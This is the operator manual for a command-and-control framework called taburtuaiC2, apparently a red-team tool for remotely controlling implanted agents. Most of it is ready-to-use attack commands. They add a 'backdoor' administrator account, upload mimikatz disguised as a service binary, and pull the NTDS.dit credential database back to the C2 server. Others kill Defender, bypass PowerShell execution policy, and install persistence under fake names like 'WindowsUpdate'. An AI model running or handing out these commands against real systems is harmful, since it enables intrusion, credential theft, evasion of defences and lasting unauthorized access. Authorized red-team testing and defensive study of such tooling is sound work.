# taburtuaiC2 · Operator CLI

**Version** 2.0.0 &nbsp;·&nbsp; **Author** mjopsec &nbsp;·&nbsp; **License** MIT

> Authorized red team use only. All activity is logged server-side.

---

## Table of Contents

| # | Section |
|---|---------|
| 1 | [Getting Started](#1-getting-started) |
| 2 | [Global Flags](#2-global-flags) |
| 3 | [Agent Management](#3-agent-management) |
| 4 | [Interactive Shell](#4-interactive-shell) |
| 5 | [Command Execution](#5-command-execution) |
| 6 | [File Operations](#6-file-operations) |
| 7 | [Process Management](#7-process-management) |
| 8 | [Persistence](#8-persistence) |
| 9 | [Queue Management](#9-queue-management) |
| 10 | [Server & Logs](#10-server--logs) |
| 11 | [Quick Reference](#11-quick-reference) |

---

## 1. Getting Started

### Installation

```bash
# Build binary (recommended)
go build -o bin/operator ./cmd/operator

# Or run directly without building
go run ./cmd/operator <command>
```

### Connecting to a Server

```bash
# Via flag (one-time)
./bin/operator --server http://172.23.0.118:9000 agents list

# Via environment variable (persistent in session)
export TABURTUAI_SERVER=http://172.23.0.118:9000
./bin/operator agents list

# With API key authentication (if server has --auth enabled)
export TABURTUAI_API_KEY=your_secret_token
./bin/operator agents list
```

### Agent ID Shorthand

All commands accept either a full UUID or a unique prefix. The CLI resolves the prefix automatically.

```bash
# Full UUID
./bin/operator shell 7d019eb7-3489-45f6-a2ab-c48d28d8e86c

# Short prefix (minimum 6–8 chars recommended)
./bin/operator shell 7d019eb7
```

If the prefix matches multiple agents, the CLI returns an error and asks for a more specific prefix.

---

## 2. Global Flags

These flags apply to every command.

| Flag | Short | Env Variable | Default | Description |
|------|-------|-------------|---------|-------------|
| `--server` | `-s` | `TABURTUAI_SERVER` | `http://localhost:8080` | C2 server URL |
| `--api-key` | `-k` | `TABURTUAI_API_KEY` | — | Bearer token for authenticated servers |
| `--timeout` | `-t` | — | `30` | HTTP request timeout in seconds |
| `--verbose` | `-v` | — | `false` | Print debug output |

---

## 3. Agent Management

### `agents list`

List all registered agents with status and last-seen time.

```bash
operator agents list
```

**Agent Status**

| Status | Condition | Commands |
|--------|-----------|----------|
| `online` | Beaconed within last 10 min | Accepted |
| `dormant` | No beacon for 10–30 min | Accepted — delivered on next beacon |
| `offline` | No beacon for > 30 min | Rejected |

> Thresholds are configurable on the server via `AGENT_DORMANT_SEC` and `AGENT_OFFLINE_SEC`.

---

### `agents info <agent-id>`

Show full details for a single agent: OS, architecture, privileges, working directory, and beacon statistics.

```bash
operator agents info 7d019eb7
```

---

### `agents delete <agent-id>`

Remove an agent record from the server database. Does not terminate the running implant.

```bash
operator agents delete 7d019eb7
```

---

## 4. Interactive Shell

Start a persistent interactive shell session with an agent.

```bash
operator shell <agent-id>
```

**Behavior**
- Each command is queued on the server and picked up by the agent on its next beacon
- Response latency equals the beacon interval (default: 10 s ± 20% jitter)
- Session persists until you type `exit`, `quit`, or press `Ctrl+D`

**Example**

```
  shell  7d019eb7  · exit to quit

[7d019eb7] › whoami
blackout\nurkh

[7d019eb7] › ipconfig /all
Windows IP Configuration
...

[7d019eb7] › exit
```

> For time-sensitive operations, build the agent with a shorter `--interval` (e.g. `--interval 2`).

---

## 5. Command Execution

### `cmd execute <agent-id> "<command>" [flags]`

Queue a single shell command on an agent and (optionally) wait for the result.

```bash
operator cmd execute <agent-id> "<command>" [flags]
```

**Flags**

| Flag | Default | Description |
|------|---------|-------------|
| `--timeout` | `60` | Seconds to wait for the result |
| `--workdir` | — | Working directory on the agent |
| `--background` | `false` | Queue and return immediately without waiting |

**Examples**

```bash
# Basic execution
operator cmd execute 7d019eb7 "whoami"

# With working directory
operator cmd execute 7d019eb7 "dir" --workdir "C:\Users\nurkh\Desktop"

# Background (fire and forget)
operator cmd execute 7d019eb7 "net user backdoor P@ss123 /add" --background
```

---

### `status <command-id>`

Check the result of any previously queued command by its ID.

```bash
operator status 5ba1dcad-5705-42bd-becd-3a749884216f
```

**Status Values**

| Value | Meaning |
|-------|---------|
| `pending` | Waiting for agent to pick up |
| `in_progress` | Agent is executing |
| `completed` | Finished successfully |
| `failed` | Executed but returned non-zero exit or error |
| `timeout` | Exceeded the command timeout |

---

### `history <agent-id> [flags]`

View command execution history for an agent.

```bash
operator history <agent-id> [--limit N] [--status STATUS]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--limit` | `20` | Number of records to return (max 1000) |
| `--status` | — | Filter: `pending` · `completed` · `failed` |

```bash
operator history 7d019eb7 --limit 50
operator history 7d019eb7 --status failed
```

---

## 6. File Operations

All file transfers route through the C2 server. The server queues the operation and the agent executes it on the next beacon.

### `files upload <agent-id> <local-path> <remote-path>`

Upload a local file to the agent.

```bash
operator files upload 7d019eb7 /tmp/mimikatz.exe "C:\Windows\Temp\svc.exe"
```

| Flag | Default | Description |
|------|---------|-------------|
| `--wait` | `false` | Wait for agent to confirm write |

---

### `files download <agent-id> <remote-path> <local-path>`

Download a file from the agent to the C2 server.

```bash
operator files download 7d019eb7 "C:\Users\nurkh\NTDS.dit" /tmp/NTDS.dit
```

| Flag | Default | Description |
|------|---------|-------------|
| `--wait` | `false` | Wait for agent to complete exfiltration |

> **Note**: The downloaded file is saved on the **C2 server**, not the operator machine. If running the CLI remotely, retrieve the file from the server separately.

---

## 7. Process Management

### `process list <agent-id>`

Retrieve a list of all running processes on the agent.

```bash
operator process list 7d019eb7 --wait
```

| Flag | Default | Description |
|------|---------|-------------|
| `--wait` | `true` | Wait for the process list to be returned |

---

### `process kill <agent-id> [flags]`

Terminate a process by PID or by name. One of `--pid` or `--name` is required.

```bash
operator process kill 7d019eb7 --pid 4821
operator process kill 7d019eb7 --name defender.exe
```

| Flag | Short | Description |
|------|-------|-------------|
| `--pid` | `-p` | Process ID to terminate |
| `--name` | `-n` | Process name to terminate (kills all matching) |
| `--wait` | — | Wait for confirmation |

---

### `process start <agent-id> <executable> [flags]`

Launch a new process on the agent. The executable path is a positional argument.

```bash
operator process start 7d019eb7 "C:\Windows\System32\cmd.exe"
operator process start 7d019eb7 "powershell.exe" --args "-NoProfile -ExecutionPolicy Bypass -File C:\tmp\run.ps1"
operator process start 7d019eb7 "notepad.exe" --wait
```

| Flag | Short | Description |
|------|-------|-------------|
| `--args` | `-a` | Arguments passed to the executable |
| `--wait` | — | Wait for process output |

---

## 8. Persistence

Install or remove persistence mechanisms to maintain access across reboots.

### `persistence setup <agent-id> [flags]`

```bash
operator persistence setup <agent-id> --method <method> --path <executable> [flags]
```

**Flags**

| Flag | Required | Default | Description |
|------|----------|---------|-------------|
| `--method` | Yes | — | Persistence method (see table below) |
| `--path` | Yes | — | Full path to executable on the target |
| `--name` | No | auto-generated | Entry name (registry key / task / service name) |
| `--args` | No | — | Arguments passed to the executable at launch |
| `--wait` | No | `false` | Wait for agent to confirm |

**Persistence Methods**

| Platform | Method | Trigger | Privilege |
|----------|--------|---------|-----------|
| Windows | `registry_run` | User logon | User |
| Windows | `schtasks_onlogon` | User logon | User |
| Windows | `schtasks_daily` | Daily schedule | User |
| Windows | `startup_folder` | User logon | User |
| Linux | `cron_reboot` | System reboot | User |
| Linux | `systemd_user` | User session | User |
| Linux | `bashrc` | Interactive shell | User |
| macOS | `launchagent` | User logon | User |

**Method Aliases**

| Alias | Resolves To |
|-------|-------------|
| `registry`, `reg` | `registry_run` |
| `task`, `schtask`, `scheduled` | `schtasks_onlogon` |
| `startup`, `folder` | `startup_folder` |
| `cron` | `cron_reboot` |
| `systemd`, `service` | `systemd_user` |
| `bash` | `bashrc` |
| `launch`, `plist` | `launchagent` |

**Examples**

```bash
# Windows — registry key
operator persistence setup 7d019eb7 \
  --method registry_run \
  --path "C:\Windows\Temp\agent.exe" \
  --name "WindowsUpdate"

# Windows — scheduled task, wait for confirmation
operator persistence setup 7d019eb7 \
  --method schtasks_onlogon \
  --path "C:\Windows\Temp\agent.exe" \
  --name "SvcHostMonitor" \
  --wait

# Linux — cron on reboot
operator persistence setup 7d019eb7 \
  --method cron_reboot \
  --path /tmp/.agent
```

---

### `persistence remove <agent-id> [flags]`

Remove a previously installed persistence entry. Both `--method` and `--name` are required.

```bash
operator persistence remove <agent-id> --method <method> --name <name>
```

| Flag | Required | Description |
|------|----------|-------------|
| `--method` | Yes | Same method used during setup |
| `--name` | Yes | Same entry name used during setup |
| `--wait` | No | Wait for agent to confirm removal |

```bash
operator persistence remove 7d019eb7 --method registry_run --name "WindowsUpdate"
```

---

## 9. Queue Management

### `queue stats`

Show pending command counts across all agents.

```bash
operator queue stats
```

---

### `queue clear <agent-id>`

Flush all pending (not yet executed) commands for an agent.

```bash
operator queue clear 7d019eb7
```

> Use this to cancel commands queued for an offline agent before reassigning.

---

## 10. Server & Logs

### `logs [flags]`

Fetch server-side event logs.

```bash
operator logs [--limit N] [--level LEVEL]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--limit` | `50` | Number of log entries to return |
| `--level` | — | Filter: `DEBUG` · `INFO` · `WARN` · `ERROR` |

```bash
operator logs --limit 200 --level WARN
```

---

### `stats`

Show a server health snapshot: uptime, agent counts by status, queue depth, and command totals.

```bash
operator stats
```

---

### `version`

Print the CLI version string.

```bash
operator version
```

---

## 11. Quick Reference

```
AGENTS
  agents list                                    list all agents + status
  agents info <id>                               detailed agent info
  agents delete <id>                             remove agent record

EXECUTION
  shell <id>                                     interactive shell session
  cmd execute <id> "<cmd>" [--workdir] [--bg]    single command
  status <cmd-id>                                check command result
  history <id> [--limit] [--status]              execution history

FILES
  files upload   <id> <local>  <remote>          push file to agent
  files download <id> <remote> <local>           pull file from agent

PROCESS
  process list  <id>                             list running processes
  process kill  <id> --pid <n> | --name <name>   terminate process
  process start <id> <exe> [--args "..."]        launch process

PERSISTENCE
  persistence setup  <id> --method <m> --path <exe> [--name] [--args]
  persistence remove <id> --method <m> --name <n>

QUEUE
  queue stats                                    pending command overview
  queue clear <id>                               flush pending queue

SERVER
  logs   [--limit] [--level]                     server event logs
  stats                                          server health snapshot
  version                                        CLI version
```
